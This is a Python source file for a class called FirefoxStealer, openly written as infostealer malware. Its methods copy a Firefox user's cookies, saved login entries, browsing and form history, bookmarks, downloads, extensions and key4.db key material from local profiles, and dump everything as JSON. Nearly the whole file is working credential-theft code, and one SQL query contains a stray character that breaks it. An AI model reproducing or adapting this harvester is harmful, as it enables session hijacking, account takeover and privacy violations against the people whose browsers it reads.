import os
import sys
import json
import base64
import sqlite3
import shutil
import tempfile
from datetime import datetime
from typing import Dict, List, Any, Optional

class FirefoxStealer:
    def __init__(self):
        self.appdata = os.getenv("APPDATA")
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.temp_dir = tempfile.gettempdir()
        self.firefox_path = self.get_firefox_path()
        self.profiles = self.get_profiles()
    
    def get_firefox_path(self):
        paths = [
            os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles"),
            os.path.join(self.localappdata, "Mozilla", "Firefox", "Profiles"),
            os.path.join(self.appdata, "Mozilla", "Firefox"),
            os.path.join(self.localappdata, "Mozilla", "Firefox")
        ]
        
        for path in paths:
            if os.path.exists(path):
                return path
        
        return None
    
    def get_profiles(self):
        profiles = []
        
        if not self.firefox_path or not os.path.exists(self.firefox_path):
            return profiles
        
        try:
            # Check if we're in Profiles directory
            if "Profiles" in self.firefox_path:
                for item in os.listdir(self.firefox_path):
                    if item.endswith(".default") or item.endswith(".default-release") or item.endswith(".default-esr"):
                        profiles.append(os.path.join(self.firefox_path, item))
            else:
                # Look for profiles.ini
                profiles_ini = os.path.join(self.firefox_path, "profiles.ini")
                if os.path.exists(profiles_ini):
                    with open(profiles_ini, "r", encoding="utf-8") as f:
                        content = f.read()
                    
                    # Parse profiles.ini
                    current_profile = {}
                    for line in content.split("\n"):
                        if line.startswith("["):
                            if current_profile:
                                if "Path" in current_profile and "IsRelative" in current_profile:
                                    if current_profile["IsRelative"] == "1":
                                        profile_path = os.path.join(self.firefox_path, current_profile["Path"])
                                    else:
                                        profile_path = current_profile["Path"]
                                    
                                    if os.path.exists(profile_path):
                                        profiles.append(profile_path)
                            current_profile = {}
                        elif "=" in line:
                            key, value = line.split("=", 1)
                            current_profile[key.strip()] = value.strip()
                    
                    if current_profile:
                        if "Path" in current_profile and "IsRelative" in current_profile:
                            if current_profile["IsRelative"] == "1":
                                profile_path = os.path.join(self.firefox_path, current_profile["Path"])
                            else:
                                profile_path = current_profile["Path"]
                            
                            if os.path.exists(profile_path):
                                profiles.append(profile_path)
        except:
            pass
        
        return profiles
    
    def steal_cookies(self):
        cookies = []
        
        for profile in self.profiles:
            cookie_db = os.path.join(profile, "cookies.sqlite")
            
            if os.path.exists(cookie_db):
                try:
                    temp_db = os.path.join(self.temp_dir, f"firefox_cookies_{os.path.basename(profile)}.db")
                    shutil.copy2(cookie_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute("""
                        SELECT host, name, value, path, expiry, isSecure, isHttpOnly,
                               creationTime, lastAccessed, sameSite
                        FROM moz_cookies
                    """)
                    
                    for row in cursor.fetchall():
                        host, name, value, path, expiry, secure, httponly, creation, last_access, same_site = row
                        
                        # Convert Firefox timestamps (microseconds since epoch)
                        creation_dt = datetime.fromtimestamp(creation / 1000000).isoformat() if creation else None
                        expiry_dt = datetime.fromtimestamp(expiry / 1000000).isoformat() if expiry else None
                        last_access_dt = datetime.fromtimestamp(last_access / 1000000).isoformat() if last_access else None
                        
                        cookies.append({
                            "browser": "Firefox",
                            "profile": os.path.basename(profile),
                            "host": host,
                            "name": name,
                            "value": value,
                            "path": path,
                            "expiry": expiry_dt,
                            "is_secure": secure,
                            "is_httponly": httponly,
                            "creation_time": creation_dt,
                            "last_accessed": last_access_dt,
                            "same_site": same_site
                        })
                    
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
        
        return cookies
    
    def steal_passwords(self):
        passwords = []
        
        for profile in self.profiles:
            logins_file = os.path.join(profile, "logins.json")
            
            if os.path.exists(logins_file):
                try:
                    with open(logins_file, "r", encoding="utf-8") as f:
                        logins_data = json.load(f)
                    
                    for login in logins_data.get("logins", []):
                        passwords.append({
                            "browser": "Firefox",
                            "profile": os.path.basename(profile),
                            "hostname": login.get("hostname", ""),
                            "form_submit_url": login.get("formSubmitURL", ""),
                            "http_realm": login.get("httpRealm", ""),
                            "username": login.get("encryptedUsername", ""),
                            "password": login.get("encryptedPassword", ""),
                            "username_field": login.get("usernameField", ""),
                            "password_field": login.get("passwordField", ""),
                            "time_created": login.get("timeCreated", ""),
                            "time_last_used": login.get("timeLastUsed", ""),
                            "time_password_changed": login.get("timePasswordChanged", "")
                        })
                except:
                    pass
        
        return passwords
    
    def steal_history(self):
        history = []
        
        for profile in self.profiles:
            history_db = os.path.join(profile, "places.sqlite")
            
            if os.path.exists(history_db):
                try:
                    temp_db = os.path.join(self.temp_dir, f"firefox_history_{os.path.basename(profile)}.db")
                    shutil.copy2(history_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute("""
                        SELECT p.url, p.title, p.visit_count, p.last_visit_date, p.first_visit_date
                        FROM moz_places p
                        WHERE p.visit_count > 0
                        ORDER BY p.last_visit_date DESC
                        LIMIT 200
                    """)
                    
                    for row in cursor.fetchall():
                        url, title, visit_count, last_visit, first_visit = row
                        
                        last_visit_dt = datetime.fromtimestamp(last_visit / 1000000).isoformat() if last_visit else None
                        first_visit_dt = datetime.fromtimestamp(first_visit / 1000000).isoformat() if first_visit else None
                        
                        history.append({
                            "browser": "Firefox",
                            "profile": os.path.basename(profile),
                            "url": url,
                            "title": title,
                            "visit_count": visit_count,
                            "last_visit": last_visit_dt,
                            "first_visit": first_visit_dt
                        })
                    
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
        
        return history
    
    def steal_bookmarks(self):
        bookmarks = []
        
        for profile in self.profiles:
            places_db = os.path.join(profile, "places.sqlite")
            
            if os.path.exists(places_db):
                try:
                    temp_db = os.path.join(self.temp_dir, f"firefox_bookmarks_{os.path.basename(profile)}.db")
                    shutil.copy2(places_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute("""
                        SELECT b.title, p.url, b.dateAdded, b.lastModified
                        FROM moz_bookmarks b
                        JOIN moz_places p ON b.fk = p.id
                        WHERE b.type = 1
                    """)
                    
                    for row in cursor.fetchall():
                        title, url, date_added, last_modified = row
                        
                        date_added_dt = datetime.fromtimestamp(date_added / 1000000).isoformat() if date_added else None
                        last_modified_dt = datetime.fromtimestamp(last_modified / 1000000).isoformat() if last_modified else None
                        
                        bookmarks.append({
                            "browser": "Firefox",
                            "profile": os.path.basename(profile),
                            "title": title,
                            "url": url,
                            "date_added": date_added_dt,
                            "last_modified": last_modified_dt
                        })
                    
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
        
        return bookmarks
    
    def steal_downloads(self):
        downloads = []
        
        for profile in self.profiles:
            places_db = os.path.join(profile, "places.sqlite")
            
            if os.path.exists(places_db):
                try:
                    temp_db = os.path.join(self.temp_dir, f"firefox_downloads_{os.path.basename(profile)}.db")
                    shutil.copy2(places_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute("""
                        SELECT p.url, p.title, a.content, a.dateAdded, a.lastModified
                        FROM moz_annos a
                        JOIN moz_places p ON a.place_id = p.id
                        WHERE a.anno_attribute_id = (
                            SELECT id FROM moz_anno_attributes WHERE name = 'downloads/destinationFileName'
                        )
                        LIMIT 100
                    """)
                    
                    for row in cursor.fetchall():
                        url, title, destination, date_added, last_modified = row
                        
                        date_added_dt = datetime.fromtimestamp(date_added / 1000000).isoformat() if date_added else None
                        last_modified_dt = datetime.fromtimestamp(last_modified / 1000000).isoformat() if last_modified else None
                        
                        downloads.append({
                            "browser": "Firefox",
                            "profile": os.path.basename(profile),
                            "url": url,
                            "title": title,
                            "destination": destination,
                            "date_added": date_added_dt,
                            "last_modified": last_modified_dt
                        })
                    
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
        
        return downloads
    
    def steal_form_history(self):
        form_history = []
        
        for profile in self.profiles:
            form_db = os.path.join(profile, "formhistory.sqlite")
            
            if os.path.exists(form_db):
                try:
                    temp_db = os.path.join(self.temp_dir, f"firefox_forms_{os.path.basename(profile)}.db")
                    shutil.copy2(form_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute(""">
                        SELECT fieldname, value, timesUsed, firstUsed, lastUsed
                        FROM moz_formhistory
                        LIMIT 100
                    """)
                    
                    for row in cursor.fetchall():
                        fieldname, value, times_used, first_used, last_used = row
                        
                        first_used_dt = datetime.fromtimestamp(first_used / 1000000).isoformat() if first_used else None
                        last_used_dt = datetime.fromtimestamp(last_used / 1000000).isoformat() if last_used else None
                        
                        form_history.append({
                            "browser": "Firefox",
                            "profile": os.path.basename(profile),
                            "fieldname": fieldname,
                            "value": value,
                            "times_used": times_used,
                            "first_used": first_used_dt,
                            "last_used": last_used_dt
                        })
                    
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
        
        return form_history
    
    def steal_extensions(self):
        extensions = []
        
        for profile in self.profiles:
            extensions_file = os.path.join(profile, "extensions.json")
            
            if os.path.exists(extensions_file):
                try:
                    with open(extensions_file, "r", encoding="utf-8") as f:
                        extensions_data = json.load(f)
                    
                    for ext in extensions_data.get("addons", []):
                        extensions.append({
                            "browser": "Firefox",
                            "profile": os.path.basename(profile),
                            "id": ext.get("id", ""),
                            "name": ext.get("defaultLocale", {}).get("name", ""),
                            "version": ext.get("version", ""),
                            "description": ext.get("defaultLocale", {}).get("description", ""),
                            "active": ext.get("active", False)
                        })
                except:
                    pass
        
        return extensions
    
    def steal_key4_db(self):
        key_data = []
        
        for profile in self.profiles:
            key4_db = os.path.join(profile, "key4.db")
            
            if os.path.exists(key4_db):
                try:
                    temp_db = os.path.join(self.temp_dir, f"firefox_key4_{os.path.basename(profile)}.db")
                    shutil.copy2(key4_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    # Get encryption key and IV
                    cursor.execute("""
                        SELECT item1, item2
                        FROM metadata
                        WHERE id = 'password'
                    """)
                    
                    row = cursor.fetchone()
                    if row:
                        key_data.append({
                            "browser": "Firefox",
                            "profile": os.path.basename(profile),
                            "encrypted_key": base64.b64encode(row[0]).decode() if row[0] else "",
                            "iv": base64.b64encode(row[1]).decode() if row[1] else ""
                        })
                    
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
        
        return key_data
    
    def steal_all(self):
        return {
            "cookies": self.steal_cookies(),
            "passwords": self.steal_passwords(),
            "history": self.steal_history(),
            "bookmarks": self.steal_bookmarks(),
            "downloads": self.steal_downloads(),
            "form_history": self.steal_form_history(),
            "extensions": self.steal_extensions(),
            "key_data": self.steal_key4_db()
        }

if __name__ == "__main__":
    stealer = FirefoxStealer()
    data = stealer.steal_all()
    print(json.dumps(data, indent=2, default=str))